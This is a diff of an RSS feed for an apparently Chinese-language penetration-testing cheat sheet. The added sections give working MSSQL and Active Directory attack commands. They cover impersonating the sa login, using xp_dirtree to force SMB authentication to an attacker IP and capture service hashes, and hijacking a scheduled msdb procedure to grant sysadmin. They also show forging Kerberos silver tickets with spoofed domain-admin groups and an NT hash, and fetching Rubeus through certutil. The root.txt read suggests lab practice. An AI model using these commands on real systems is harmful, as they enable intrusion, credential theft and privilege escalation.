@@ -2,16 +2,16 @@
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
     <channel>
         <title>魔法书 on wackymaker</title>
-        <link>http://localhost:1313/categories/%E9%AD%94%E6%B3%95%E4%B9%A6/</link>
+        <link>https://wackymaker.github.io/categories/%E9%AD%94%E6%B3%95%E4%B9%A6/</link>
         <description>Recent content in 魔法书 on wackymaker</description>
         <generator>Hugo -- gohugo.io</generator>
         <language>en-us</language>
-        <lastBuildDate>Tue, 07 Oct 2025 19:40:56 +0800</lastBuildDate><atom:link href="http://localhost:1313/categories/%E9%AD%94%E6%B3%95%E4%B9%A6/index.xml" rel="self" type="application/rss+xml" /><item>
+        <lastBuildDate>Sat, 11 Oct 2025 19:40:56 +0800</lastBuildDate><atom:link href="https://wackymaker.github.io/categories/%E9%AD%94%E6%B3%95%E4%B9%A6/index.xml" rel="self" type="application/rss+xml" /><item>
         <title>血缇之书</title>
-        <link>http://localhost:1313/post/%E8%A1%80%E7%BC%87%E4%B9%8B%E4%B9%A6/</link>
-        <pubDate>Tue, 07 Oct 2025 19:40:56 +0800</pubDate>
+        <link>https://wackymaker.github.io/post/%E8%A1%80%E7%BC%87%E4%B9%8B%E4%B9%A6/</link>
+        <pubDate>Sat, 11 Oct 2025 19:40:56 +0800</pubDate>
         
-        <guid>http://localhost:1313/post/%E8%A1%80%E7%BC%87%E4%B9%8B%E4%B9%A6/</guid>
+        <guid>https://wackymaker.github.io/post/%E8%A1%80%E7%BC%87%E4%B9%8B%E4%B9%A6/</guid>
         <description>&lt;h1 id=&#34;信息收集-枚举&#34;&gt;信息收集-枚举
 &lt;/h1&gt;&lt;h2 id=&#34;前枚举&#34;&gt;前枚举
 &lt;/h2&gt;&lt;h3 id=&#34;域名解析&#34;&gt;域名解析
@@ -1129,6 +1129,12 @@ nxc&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SELECT name FROM master..syslogins
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;查找具备sysadmin管理员权限用户&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SELECT name FROM master..syslogins WHERE sysadmin &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;1&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;查找自身模拟权限&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SELECT grantor.name AS Grantor, grantee.name AS Grantee, permission_name, state_desc FROM sys.server_permissions sp JOIN sys.server_principals grantor ON sp.grantor_principal_id &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; grantor.principal_id JOIN sys.server_principals grantee ON sp.grantee_principal_id &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; grantee.principal_id WHERE permission_name &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;IMPERSONATE&amp;#39;&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;查找模拟用户&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SQL &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;SIGNED&lt;span style=&#34;color:#ae81ff&#34;&gt;\m&lt;/span&gt;ssqlsvc  dbo@master&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;&amp;gt; enum_impersonate 
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;尝试模拟sa&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;EXECUTE AS LOGIN &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;sa&amp;#39;&lt;/span&gt;;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;列出所有数据库&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SELECT name FROM sys.databases;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;列出所有表&lt;/p&gt;
@@ -1145,8 +1151,12 @@ nxc&lt;/p&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SELECT TOP &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; $table FROM $db;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;查询密码策略&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;EXEC xp_loginconfig &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;password policy&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;查询对应账户sid&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SQL &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;SQLGuest  guest@master&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;&amp;gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;select&lt;/span&gt; sys.fn_varbintohexstr&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;SUSER_SID&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;REDELEGATE\Administrator&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;查询系统目录&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;EXEC&lt;/span&gt; MASTER.sys.xp_dirtree &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;C:\&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;xp_dirtree触发smb访问劫持服务账户hash&#34;&gt;xp_dirtree触发smb访问（劫持服务账户hash）
-&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;EXEC master..xp_dirtree &lt;span style=&#34;color:#ae81ff&#34;&gt;\&amp;#34;\\\\&lt;/span&gt;$ip&lt;span style=&#34;color:#ae81ff&#34;&gt;\\\\&lt;/span&gt;test&lt;span style=&#34;color:#ae81ff&#34;&gt;\&amp;#34;&lt;/span&gt;;
+&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;EXEC master..xp_dirtree &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;\\10.10.16.9\test&amp;#39;&lt;/span&gt;;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;xp_cmdshell相关命令执行需sa权限&#34;&gt;xp_cmdshell相关（命令执行）需sa权限
 &lt;/h4&gt;&lt;p&gt;先查询是否开启&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SELECT * FROM sys.configurations WHERE name IN &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;xp_cmdshell&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Ole Automation Procedures&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
@@ -1188,7 +1198,25 @@ nxc&lt;/p&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;在链接数据库上执行命令&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;EXECUTE &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;命令语句&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; at &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;$linked_db_name&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;注意单引号不省略，如果额外需要单引号，则双单引号转义
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;后渗透常用语法不是所有权限都需要sa但是默认具备&#34;&gt;后渗透常用语法（不是所有权限都需要sa，但是默认具备）
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;或者&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;use_link SERVER2
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;xp_cmdshell hostname
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;db_ddladmin-滥用劫持定时计划提权sa&#34;&gt;db_ddladmin 滥用（劫持定时计划提权sa）
+&lt;/h4&gt;&lt;p&gt;需求：需要有db_ddladmin权限&lt;/p&gt;
+&lt;p&gt;原理：db_ddladmin 角色允许用户修改（ALTER）数据库内的任何 DDL（数据定义语言）对象，包括存储过程。存储过程 msdb.dbo.sp_syspolicy_purge_history 是一个系统内部存储过程，它默认会被 SQL Server Agent 的一个内置作业（名为 syspolicy_purge_history）定期执行（通常是每天）。更重要的是，这个 SQL Server Agent 作业在执行时，是以拥有高权限（通常是 sysadmin）的用户身份运行的。&lt;/p&gt;
+&lt;p&gt;首先创建登陆连接&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;USE &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;master&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;CREATE LOGIN &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;link&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; WITH PASSWORD&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;N&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Password1&amp;#39;&lt;/span&gt;, DEFAULT_DATABASE&lt;span style=&#34;color:#f92672&#34;&gt;=[&lt;/span&gt;master&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;, CHECK_EXPIRATION&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;OFF, CHECK_POLICY&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;OFF
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;向db_ddladmin 角色添加登录链接&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;USE &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;msdb&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;CREATE USER &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;link&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; FOR LOGIN &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;link&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;USE &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;msdb&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ALTER ROLE &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;db_ddladmin&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; ADD MEMBER &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;link&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;修改每日定时清除任务为提权指令&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;use &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;msdb&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ALTER PROCEDURE &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;dbo&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;.&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;sp_syspolicy_purge_history&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; AS BEGIN ALTER SERVER ROLE &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;sysadmin&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; ADD MEMBER &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;link&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; END
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;此后当定时任务执行，link会获得sa权限&lt;/p&gt;
+&lt;h4 id=&#34;后渗透常用语法不是所有权限都需要sa但是默认具备&#34;&gt;后渗透常用语法（不是所有权限都需要sa，但是默认具备）
 &lt;/h4&gt;&lt;p&gt;清理最近查询记录&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;DBCC FLUSHPROCINDB&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;DB_ID&lt;span style=&#34;color:#f92672&#34;&gt;())&lt;/span&gt;;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;创建一个用户并赋予sa权限&lt;/p&gt;
@@ -1508,12 +1536,24 @@ nxc&lt;/p&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;iconv -f ASCII -t UTF-16LE &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;printf &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;password&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; | openssl dgst -md4
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;用getPac获取域sid&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;域用户即可&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;impacket-getPac -targetUser administrator $domain/$user:$pass
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;之后伪造票据，注意，同步时间需要在伪造之前进行&lt;/p&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;之后伪造票据,注意白银票据无需同步时间或者目标88口开放&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;impacket-ticketer -spn MSSQLSvc/$target -user-id &lt;span style=&#34;color:#ae81ff&#34;&gt;500&lt;/span&gt; Administrator -nthash &amp;lt;nt-hash&amp;gt; -domain-sid &amp;lt;sid&amp;gt; -domain $domain
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;## 注意这里是可以随意伪造的，不一定需要伪造成管理员，同时也具备-groups参数允许伪装组&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;## 比如这里我们可以直接伪装成所有组&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;## impacket-ticketer -nthash ef699384c3285c54128a3ee1ddb1a0cc -domain-sid $sid -domain $domain -spn MSSQLSvc/$fqdn -groups 512,519,1105 -user-id 1103 mssqlsvc&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 我们用这个票据连接会获得一个直接是&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;导入票据&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;export KRB5CCNAME&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;Administrator.ccache
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;最后连接&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;impacket-mssqlclient $target -k 
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;impacket-mssqlclient -no-pass -k $domain/Administrator@$FQDN
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;伪造域组获得高权限&#34;&gt;伪造域组获得高权限
+&lt;/h3&gt;&lt;p&gt;白银票据是可以随意伪造的，不一定需要伪造成管理员，同时也具备-groups参数允许伪装组&lt;/p&gt;
+&lt;p&gt;比如这里我们可以直接伪装成某个并不是这个组的其他用户属于这个组&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;impacket-ticketer -nthash ef699384c3285c54128a3ee1ddb1a0cc -domain-sid $sid -domain $domain -spn MSSQLSvc/$fqdn -groups 512,519,1105 -user-id &lt;span style=&#34;color:#ae81ff&#34;&gt;1103&lt;/span&gt; mssqlsvc
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;用这个伪装的服务账户我们会同时在数据库中获得域管组（512），企业管理员组（519）.以及特殊的其他组（1105）&lt;/p&gt;
+&lt;p&gt;虽然连接进去就算反弹shell也是服务账户的权限，但是可以以其组权限进行文件读取&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SELECT BulkColumn FROM OPENROWSET &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;BULK &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;C:\Users\Administrator\Desktop\root.txt&amp;#39;&lt;/span&gt;, SINGLE_CLOB&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; AS MyFile;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;域历史漏洞或者中继cve&#34;&gt;域历史漏洞或者中继（cve）
 &lt;/h2&gt;&lt;h3 id=&#34;cross-session-relay-跨会话中继&#34;&gt;Cross Session Relay 跨会话中继
 &lt;/h3&gt;&lt;p&gt;当存在其他用户登陆会话后，可以尝试打跨会话中继获得登陆会话的用户hash&lt;/p&gt;
@@ -3077,7 +3117,7 @@ linux换行&lt;/p&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;windows上传文件&#34;&gt;windows上传文件
 &lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cmd
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;certutil -urlcache -split &lt;span style=&#34;color:#f92672&#34;&gt;-f&lt;/span&gt; http&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt;//你的IP/文件路径 保存路径
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;certutil -urlcache -split &lt;span style=&#34;color:#f92672&#34;&gt;-f&lt;/span&gt; http&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt;//&lt;span style=&#34;color:#ae81ff&#34;&gt;10.10&lt;/span&gt;.16.&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;/Rubeus-&lt;span style=&#34;color:#ae81ff&#34;&gt;472&lt;/span&gt;.exe C:\windows\tasks\&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;.exe
